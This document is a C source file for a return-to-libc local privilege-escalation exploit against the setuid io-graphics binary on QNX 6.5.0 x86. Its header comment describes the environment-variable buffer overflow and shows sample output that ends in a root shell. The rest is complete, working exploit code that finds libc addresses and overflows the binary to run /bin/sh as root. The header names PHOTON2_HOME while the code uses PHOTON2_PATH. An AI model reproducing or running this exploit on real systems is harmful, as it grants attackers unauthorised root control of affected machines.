/*
 *        QNX 6.5.0 x86 io-graphics local root exploit by cenobyte 2013
 *                        <vincitamorpatriae@gmail.com>
 *
 * - vulnerability description:
 * Setuid root /usr/photon/bin/io-graphics on QNX is prone to a buffer overflow.
 * The vulnerability is due to insufficent bounds checking of the PHOTON2_HOME
 * environment variable.
 *
 * - vulnerable platforms:
 * QNX 6.5.0SP1
 * QNX 6.5.0
 * QNX 6.4.1
 *
 * - not vulnerable:
 * QNX 6.3.0
 *
 * - exploit information:
 * This is a return-to-libc exploit that yields euid=0. The addresses of
 * system() and exit() are retrieved from libc using dlsym().
 *
 * The address of /bin/sh is retrieved by searching from address 0xb0300000.
 *
 * - example:
 * $ uname -a
 * QNX localhost 6.5.0 2010/07/09-14:44:03EDT x86pc x86
 * $ id
 * uid=100(user) gid=100
 * $ ./qnx-io-graphics
 * QNX io-graphics 6.5.0 x86 local root exploit by cenobyte 2013
 * [-] system(): 0xb031bd80
 * [-] exit(): 0xb032b5f0
 * [-] /bin/sh: 0xb0374412
 * # id
 * uid=100(user) gid=100 euid=0(root)
 *
 */

#include <dlfcn.h>
#include <err.h>
#include <signal.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define VULN "PHOTON2_PATH="

static void fail(void);
static void checknull(unsigned int addr);
static unsigned int find_string(char *s);
static unsigned int find_libc(char *syscall);

void
checknull(unsigned int addr)
{
	if (!(addr & 0xff) || \
	    !(addr & 0xff00) || \
	    !(addr & 0xff0000) || \
	    !(addr & 0xff000000))
		errx(1, "return-to-libc failed: " \
		    "0x%x contains a null byte", addr);
}

void
fail(void)
{
	printf("\n");
	errx(1, "return-to-libc failed");
}

unsigned int
find_string(char *string)
{
	unsigned int i;
	char *a;

	printf("[-] %s: ", string);

	signal(SIGSEGV, fail);

	for (i = 0xb0300000; i < 0xdeadbeef; i++) {
		a = i;

		if (strcmp(a, string) != 0)
			continue;

		printf("0x%x\n", i);
		checknull(i);

		return(i);
	}

	return(1);
}

unsigned int
find_libc(char *syscall)
{
	void *s;
	unsigned int syscall_addr;

	if (!(s = dlopen(NULL, RTLD_LAZY)))
		errx(1, "error: dlopen() failed");

	if (!(syscall_addr = (unsigned int)dlsym(s, syscall)))
		errx(1, "error: dlsym() %s", syscall);

	printf("[-] %s(): 0x%x\n", syscall, syscall_addr);
	checknull(syscall_addr);
	return(syscall_addr);

	return(1);
}

int
main()
{
	unsigned int offset = 429;
	unsigned int system_addr;
	unsigned int exit_addr;
	unsigned int binsh_addr;

	char env[440];
	char *prog[] = { "/usr/photon/bin/io-graphics", "io-graphics", NULL };
	char *envp[] = { env, NULL };

	printf("QNX 6.5.0 x86 io-graphics local root exploit by cenobyte 2013\n\n");

	system_addr = find_libc("system");
	exit_addr = find_libc("exit");
	binsh_addr = find_string("/bin/sh");

	memset(env, 0xEB, sizeof(env));
	memcpy(env, VULN, strlen(VULN));
	memcpy(env + offset, (char *)&system_addr, 4);
	memcpy(env + offset + 4, (char *)&exit_addr, 4);
	memcpy(env + offset + 8, (char *)&binsh_addr, 4);

	execve(prog[0], prog, envp);

	return(0);
}